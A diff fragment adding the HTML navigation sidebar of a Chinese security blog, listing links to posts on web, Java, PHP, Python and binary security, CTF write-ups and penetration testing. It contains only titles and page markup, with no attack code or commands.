+<li><a href="https://blog.csdn.net/SKI_12/article/details/77103290" target="_blank" rel="noopener">(旧博客)Metasploit的Docker安装及其Eternal Blue（永恒之蓝）渗透实现</a></li>
+</ul>
+</li>
+<li>内网渗透<ul>
+<li><a href="/2020/02/15/内网渗透基础/">内网渗透基础与域环境搭建</a></li>
+<li><a href="/2020/02/18/Windows-PowerShell基础/">内网渗透之Windows PowerShell基础</a></li>
+<li><a href="/2020/02/27/内网信息收集之本机信息收集/">内网信息收集之本机信息收集</a></li>
+<li><a href="/2020/03/08/内网信息收集之域相关信息收集/">内网信息收集之域相关信息收集</a></li>
+</ul>
+</li>
+<li>提权<ul>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（一）：Administrator提权到System">Administrator提权到System</a></li>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（二）：注入进程和利用漏洞提权">注入进程和利用漏洞提权</a></li>
+</ul>
+</li>
+<li>免杀</li>
+<li>工具<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78333085" target="_blank" rel="noopener">(旧博客)Wireshark进阶之网络问题案例分析</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/61651960" target="_blank" rel="noopener">(旧博客)关于nmap所有的参数</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60332892" target="_blank" rel="noopener">(旧博客)关于Xsser的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60151041" target="_blank" rel="noopener">(旧博客)关于skipfish的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/58677137" target="_blank" rel="noopener">(旧博客)关于Vega的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/58188331" target="_blank" rel="noopener">(旧博客)关于SQLMAP所有参数的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/57418307" target="_blank" rel="noopener">(旧博客)关于NETCAT的学习笔记</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>OS</strong><ul>
+<li>Windows<ul>
+<li><a href="/2019/01/01/将Python脚本转换为exe">将Python脚本转换为exe</a></li>
+<li><a href="/2019/01/01/几个查看用户信息的Windows程序">几个查看用户信息的Windows程序</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78716967" target="_blank" rel="noopener">(旧博客)Windows系统安全小结</a></li>
+</ul>
+</li>
+<li>Linux<ul>
+<li><a href="/2020/03/28/Linux安全笔记/">Linux安全笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78169962" target="_blank" rel="noopener">(旧博客)Linux查找命令小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/72614754" target="_blank" rel="noopener">(旧博客)关于iptables防火墙的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63680773" target="_blank" rel="noopener">(旧博客)关于Linux日志的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78837765" target="_blank" rel="noopener">(旧博客)Ubuntu搭建MongoDB集群</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><strong>云</strong><ul>
+<li>云安全</li>
+<li>Docker<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76696436" target="_blank" rel="noopener">(旧博客)Docker基本命令以及Ubuntu16.04更换源</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76713869" target="_blank" rel="noopener">(旧博客)使用Docker搭建基于MySQL、Apache和PHP的DVWA服务器</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</div>
+
+<script src="/js/book-sidebar.js"></script>
+
+<script>
+collapse_sidebar(2)
+highlight_tab()
+show_sidebar()
+</script>
+      </div>
+
+      <div class="column col-8 col-lg-12">
+        <div class="book-content">
+          <div class="book-navbar">
+  <header class="navbar">
+  <section class="navbar-section">
+    <img class="navbar-icon" src="/kanxi.jpg">
+  </section>
+  <section class="navbar-center">
+    Mi1k7ea
+  </section>
+  <section class="navbar-section">
+    <label class="accordion-header c-hand" for="accordion-sidebar">
+      <i class="icon icon-menu"></i>
+    </label>
+  </section>
+</header>
+
+<div class="accordion">
+  <input type="checkbox" id="accordion-sidebar" name="accordion-checkbox" hidden>
+  <div class="accordion-body">
+    <p>Good Good Study</p>
+<ul>
+<li><strong><a href="/archives">归档</a></strong></li>
+</ul>
+<hr>
+<ul>
+<li><strong>Web安全</strong><ul>
+<li>Web安全基础&amp;Tricks<ul>
+<li><a href="/2019/10/14/文件上传漏洞总结/">文件上传攻击框架</a></li>
+<li><a href="/2019/10/04/CSWSH漏洞总结/">CSWSH漏洞总结</a></li>
+<li><a href="/2019/09/28/SSI注入漏洞总结/">SSI注入漏洞总结</a></li>
+<li><a href="/2019/08/20/JSONP跨域漏洞总结/">JSONP跨域漏洞总结</a></li>
+<li><a href="/2019/08/18/CORS跨域漏洞总结/">CORS跨域漏洞总结</a></li>
+<li><a href="/2020/01/04/浅析XSSI漏洞/">浅析XSSI漏洞</a></li>
+<li><a href="/2020/03/11/浅析HRS漏洞/">浅析HRS漏洞</a></li>
+<li><a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/">利用HTML注入劫持标签Bypass CSP</a></li>
+<li><a href="/2019/08/11/NoSQL注入之MongoDB/">NoSQL注入之MongoDB</a></li>
+<li><a href="/2019/08/10/Flash安全总结/">Flash安全总结</a></li>
+<li><a href="/2020/03/05/Redis安全小结/">Redis安全小结</a></li>
+<li><a href="/2020/02/29/SSRF-Tricks小结/">SSRF Tricks小结</a></li>
+<li><a href="/2020/01/21/CSRF-Tricks小结/">CSRF Tricks小结</a></li>
+<li><a href="/2019/08/05/利用Flash进行Json-CSRF攻击/">利用Flash进行Json CSRF攻击</a></li>
+<li><a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/">SWFUpload.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/">ZeroClipboard.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></li>
+<li><a href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></li>
+<li><a href="/2019/06/30/XSS从弹框到RCE/">XSS从弹框到RCE（IE）</a></li>
+<li><a href="/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li>
+<li><a href="/2019/06/25/浅析DOM型XSS/">浅析DOM型XSS</a></li>
+<li><a href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li>
+<li><a href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li>
+<li><a href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li>
+<li><a href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li>
+<li><a href="/2020/01/26/浅析XSSJacking/">浅析XSSJacking</a></li>
+<li><a href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li>
+<li><a href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78716609" target="_blank" rel="noopener">(旧博客)Web安全加固小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78686832" target="_blank" rel="noopener">(旧博客)DoS与DDoS小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78301189" target="_blank" rel="noopener">(旧博客)MySQL数据库提权小结</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/69952026" target="_blank" rel="noopener">(旧博客)OWASP_top_10漏洞的总结笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76944203" target="_blank" rel="noopener">(旧博客)使用Docker搭建Nginx整数溢出漏洞（CVE-2017-7529）及Python PoC验证</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76862120" target="_blank" rel="noopener">(旧博客)使用Docker搭建Struts2-048漏洞环境及Python PoC验证</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/76714002" target="_blank" rel="noopener">(旧博客)webshell的NTFS交换数据流文件隐藏及Python脚本查杀</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/59085529" target="_blank" rel="noopener">(旧博客)关于phpMyAdmin默认安装漏洞的学习笔记</a></li>
+</ul>
+</li>
+<li>Web安全之机器学习<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78457976" target="_blank" rel="noopener">(旧博客)机器学习应用之WebShell检测</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78298719" target="_blank" rel="noopener">(旧博客)数据挖掘之k-means算法的Python实现</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78012697" target="_blank" rel="noopener">(旧博客)数据挖掘之决策树归纳算法的Python实现</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78003975" target="_blank" rel="noopener">(旧博客)数据挖掘之Apriori算法的Python实现</a></li>
+</ul>
+</li>
+<li>WriteUp Web<ul>
+<li><a href="/2019/10/20/InCTF-2019-PHP三题复现/">InCTF 2019 PHP+1,+1.5,+2.5三题复现</a></li>
+<li><a href="/2019/10/05/upload-labs-WriteUp/">Upload-Labs WriteUp</a></li>
+<li><a href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li>
+<li><a href="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/">bWAPP之Cross-Origin Resource Sharing (AJAX)</a></li>
+<li><a href="/2019/07/02/DVWA之JavaScript攻击/">DVWA之JavaScript攻击</a></li>
+<li><a href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/">一道Bypass正则过滤的反序列化漏洞题目</a></li>
+<li><a href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/">从一道CTF题看如何通过本地DTD文件利用XXE实现回显</a></li>
+<li><a href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li>
+<li><a href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li>
+<li><a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li>
+<li><a href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li>
+<li><a href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li>
+<li><a href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li>
+<li><a href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li>
+<li><a href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li>
+<li><a href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80306977" target="_blank" rel="noopener">(旧博客)通过Pentester_Lab学习XML注入</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/70168346" target="_blank" rel="noopener">(旧博客)Sqli-labs之Less1-10</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60882602" target="_blank" rel="noopener">(旧博客)DVWA之PHP文件包含漏洞（File Inclusion）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60477557" target="_blank" rel="noopener">(旧博客)通过DVWA学习CSRF漏洞</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60465854" target="_blank" rel="noopener">(旧博客)通过DVWA学习存储型XSS漏洞</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/60359729" target="_blank" rel="noopener">(旧博客)通过DVWA学习反射型XSS漏洞</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/56307364" target="_blank" rel="noopener">(旧博客)通过DVWA学习SQL盲注</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/56279676" target="_blank" rel="noopener">(旧博客)通过DVWA学习SQL注入漏洞</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/54669614" target="_blank" rel="noopener">(旧博客)DVWA之PHP文件上传漏洞（File Upload）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/54630440" target="_blank" rel="noopener">(旧博客)通过DVWA学习命令执行漏洞（Command Execution）</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Java</strong><ul>
+<li>Java安全<ul>
+<li><a href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li>
+<li><a href="/2019/02/01/Java反射机制/">Java反射机制</a></li>
+<li><a href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li>
+<li><a href="/2019/09/01/Java-RMI原理与使用/">Java RMI原理与使用</a></li>
+<li><a href="/2019/11/25/（转）Java代码审计指南">（转）Java代码审计指南</a></li>
+<li><a href="/2019/11/25/（转）Java项目中常见jar包的说明">（转）Java项目中常见jar包的说明</a></li>
+<li><a href="/2019/06/09/探讨XXE防御之setFeature设置/">探讨XXE防御之setFeature设置</a></li>
+<li><a href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li>
+<li><a href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li>
+<li><a href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li>
+<li><a href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li>
+<li><a href="/2019/09/15/浅析JNDI注入/">浅析JNDI注入</a></li>
+<li><a href="/2020/01/10/SpEL表达式注入漏洞总结/">SpEL表达式注入漏洞总结</a></li>
+<li><a href="/2020/03/16/OGNL表达式注入漏洞总结/">OGNL表达式注入漏洞总结</a></li>
+<li><a href="/2020/03/24/浅析Groovy代码注入漏洞/">浅析Groovy代码注入漏洞</a></li>
+<li><a href="/2019/12/08/浅析Java-SPI安全/">浅析Java SPI安全</a></li>
+<li><a href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li>
+<li><a href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li>
+<li><a href="/2019/10/21/XStream反序列化漏洞/">Java XStream反序列化漏洞</a></li>
+<li><a href="/2019/11/29/Java-SnakeYaml反序列化漏洞">Java SnakeYaml反序列化漏洞</a></li>
+<li><a href="/2019/12/07/Java-AMF3反序列化漏洞/">Java AMF3反序列化漏洞</a></li>
+<li><a href="/2020/01/25/Java-Hessian反序列化漏洞/">Java Hessian反序列化漏洞</a></li>
+<li><a href="/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/">Fastjson系列五——高版本JDK绕过及检测与防御</a></li>
+<li><a href="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/">Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</a></li>
+<li><a href="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/">Fastjson系列三——历史版本补丁绕过（需开启AutoType）</a></li>
+<li><a href="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞</a></li>
+<li><a href="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/">Fastjson系列一——反序列化漏洞基本原理</a></li>
+<li><a href="/2019/11/24/Jackson系列七——其他Gadgets/">Jackson系列七——其他Gadgets与检测防御</a></li>
+<li><a href="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/">Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</a></li>
+<li><a href="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/">Jackson系列五——CVE-2019-12384（基于logback利用链）</a></li>
+<li><a href="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/">Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</a></li>
+<li><a href="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/">Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</a></li>
+<li><a href="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/">Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</a></li>
+<li><a href="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/">Jackson系列一——反序列化漏洞基本原理</a></li>
+</ul>
+</li>
+<li>Struts2</li>
+<li>Spring<ul>
+<li><a href="/2019/01/01/Spring基础篇之基本概念/">Spring基础篇之基本概念</a></li>
+<li><a href="/2019/01/01/Spring基础篇之IoC容器/">Spring基础篇之IoC容器</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean/">Spring基础篇之Bean</a></li>
+<li><a href="/2019/01/01/Spring基础篇之DI（依赖注入）/">Spring基础篇之DI（依赖注入）</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean装配/">Spring基础篇之Bean装配</a></li>
+<li><a href="/2019/01/01/Spring基础篇之AOP/">Spring基础篇之AOP</a></li>
+<li><a href="/2019/01/01/Spring基础篇之JDBC框架/">Spring基础篇之JDBC框架</a></li>
+<li><a href="/2019/01/01/Spring基础篇之事务管理/">Spring基础篇之事务管理</a></li>
+<li><a href="/2020/01/16/Spring-MVC笔记/">Spring MVC笔记</a></li>
+<li><a href="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/">浅析自动绑定漏洞之Spring MVC</a></li>
+<li><a href="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">由JNDI注入引发的Spring Framework反序列化漏洞</a></li>
+<li><a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之CVE-2017-8046</a></li>
+<li><a href="/2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/">浅析Spring Data Commons之CVE-2018-1273</a></li>
+<li><a href="/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/">浅析Spring Messaging之CVE-2018-1270</a></li>
+<li><a href="/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/">浅析Spring Web Flow之CVE-2017-4971</a></li>
+<li><a href="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/">浅析Spring Security OAuth2之CVE-2016-4977</a></li>
+</ul>
+</li>
+<li>SpringCloud</li>
+</ul>
+</li>
+<li><strong>PHP</strong><ul>
+<li>PHP安全<ul>
+<li><a href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li>
+<li><a href="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a></li>
+<li><a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li>
+<li><a href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li>
+<li><a href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li>
+<li><a href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li>
+<li><a href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li>
+<li><a href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li>
+<li><a href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li>
+<li><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li>
+<li><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li>
+<li><a href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li>
+<li><a href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li>
+<li><a href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li>
+<li><a href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li>
+<li><a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li>
+<li><a href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li>
+<li><a href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/70228700" target="_blank" rel="noopener">(旧博客)PHP代码审计之基础篇</a></li>
+</ul>
+</li>
+<li>CMS<ul>
+<li><a href="/2019/01/02/PHP代码审计实战之盾灵CMS/">PHP代码审计实战之盾灵CMS</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78358332" target="_blank" rel="noopener">(旧博客)PHP代码审计实战之MetInfo CMS</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78304692" target="_blank" rel="noopener">(旧博客)PHP代码审计实战之XDcms</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Python</strong><ul>
+<li>Python安全<ul>
+<li><a href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li>
+<li><a href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li>
+<li><a href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li>
+<li><a href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li>
+<li><a href="/2020/03/09/Python-urllib-CRLF注入漏洞小结/">Python urllib CRLF注入漏洞小结</a></li>
+</ul>
+</li>
+<li>安全开发<ul>
+<li><a href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li>
+<li><a href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78705998" target="_blank" rel="noopener">(旧博客)Python安全小工具之日志分析识别AWVS扫描</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78445866" target="_blank" rel="noopener">(旧博客)Python安全小工具之Linux日志痕迹清除</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78443601" target="_blank" rel="noopener">(旧博客)Python安全小工具之Web目录扫描器</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78003891" target="_blank" rel="noopener">(旧博客)Python安全小工具之计算文件Hash值</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78003609" target="_blank" rel="noopener">(旧博客)Python安全小工具之生成高精度字典</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/72972238" target="_blank" rel="noopener">(旧博客)关于《Python绝技：运用Python成为顶级黑客》的学习笔记</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/71152826" target="_blank" rel="noopener">(旧博客)关于《Python黑帽子：黑客与渗透测试编程之道》的学习笔记</a></li>
+</ul>
+</li>
+<li>爬虫<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/68961258" target="_blank" rel="noopener">(旧博客)Python爬虫之基础篇</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78411824" target="_blank" rel="noopener">(旧博客)Python爬虫之爬取动态页面数据</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78840444" target="_blank" rel="noopener">(旧博客)Python爬虫之Scrapy爬虫框架</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78850550" target="_blank" rel="noopener">(旧博客)Python爬虫之分布式爬虫</a></li>
+</ul>
+</li>
+<li>Django<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/78505235" target="_blank" rel="noopener">(旧博客)基于Django搭建简单的博客系统</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>JavaScript</strong><ul>
+<li>JavaScript安全<ul>
+<li><a href="/2019/10/20/浅析JavaScript原型链污染攻击/">浅析JavaScript原型链污染攻击</a></li>
+</ul>
+</li>
+<li>Node.js<ul>
+<li><a href="/2020/03/29/浅析Node-js安全/">浅析Node.js安全</a></li>
+<li><a href="/2020/03/29/node-serialize反序列化漏洞/">node-serialize反序列化漏洞</a></li>
+</ul>
+</li>
+<li>AngularJS<ul>
+<li><a href="/2020/03/29/浅析AngularJS安全/">浅析AngularJS安全</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>GO</strong><ul>
+<li>GO安全<ul>
+<li><a href="/2020/01/01/浅析Influxdb认证绕过漏洞/">浅析Influxdb认证绕过漏洞</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>二进制安全</strong><ul>
+<li>二进制基础<ul>
+<li><a href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li>
+<li><a href="/2019/04/27/堆基础/">堆基础</a></li>
+<li><a href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li>
+<li><a href="/2019/03/03/栈及栈帧/">栈基础</a></li>
+<li><a href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li>
+<li><a href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li>
+<li><a href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li>
+</ul>
+</li>
+<li>C/C++<ul>
+<li><a href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li>
+</ul>
+</li>
+<li>逆向工程<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80334012" target="_blank" rel="noopener">(旧博客)逆向分析HelloWorld程序</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80380974" target="_blank" rel="noopener">(旧博客)逆向分析abex’crackme#1</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80546988" target="_blank" rel="noopener">(旧博客)逆向分析abex’crackme #2</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80549743" target="_blank" rel="noopener">(旧博客)函数调用约定</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80554677" target="_blank" rel="noopener">(旧博客)栈帧</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80558193" target="_blank" rel="noopener">(旧博客)逆向分析Tut.ReverseMe1</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80571933" target="_blank" rel="noopener">(旧博客)PE文件格式</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80611969" target="_blank" rel="noopener">(旧博客)运行时压缩（UPX）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80636568" target="_blank" rel="noopener">(旧博客)基址重定位表</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80636900" target="_blank" rel="noopener">(旧博客)从可执行文件中删除.reloc节区</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80656921" target="_blank" rel="noopener">(旧博客)UPack的PE文件头分析与OEP查找</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80670045" target="_blank" rel="noopener">(旧博客)内嵌补丁练习</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80684358" target="_blank" rel="noopener">(旧博客)Windows消息钩取</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80777748" target="_blank" rel="noopener">(旧博客)DLL注入</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80780830" target="_blank" rel="noopener">(旧博客)DLL卸载</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80789234" target="_blank" rel="noopener">(旧博客)通过修改PE加载DLL</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/82947635" target="_blank" rel="noopener">(旧博客)代码注入（线程注入）</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/82954890" target="_blank" rel="noopener">(旧博客)使用汇编语言编写注入代码</a></li>
+</ul>
+</li>
+<li>Fuzzing<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/80950537" target="_blank" rel="noopener">(旧博客)Windows缓冲区溢出之SLMail</a></li>
+</ul>
+</li>
+<li>Pwn<ul>
+<li><a href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li>
+<li><a href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li>
+<li><a href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li>
+<li><a href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li>
+<li><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li>
+<li><a href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li>
+<li><a href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li>
+<li><a href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li>
+</ul>
+</li>
+<li>WriteUp Pwn<ul>
+<li><a href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li>
+</ul>
+</li>
+<li>WriteUp Reverse<ul>
+<li><a href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>渗透测试</strong><ul>
+<li>基础&amp;Tricks<ul>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63681200" target="_blank" rel="noopener">(旧博客)被动信息收集之DNS信息收集</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63681596" target="_blank" rel="noopener">(旧博客)被动信息收集之RECON-NG</a></li>
+<li><a href="https://blog.csdn.net/SKI_12/article/details/63682444" target="_blank" rel="noopener">(旧博客)主动信息收集之主机发现</a></li>
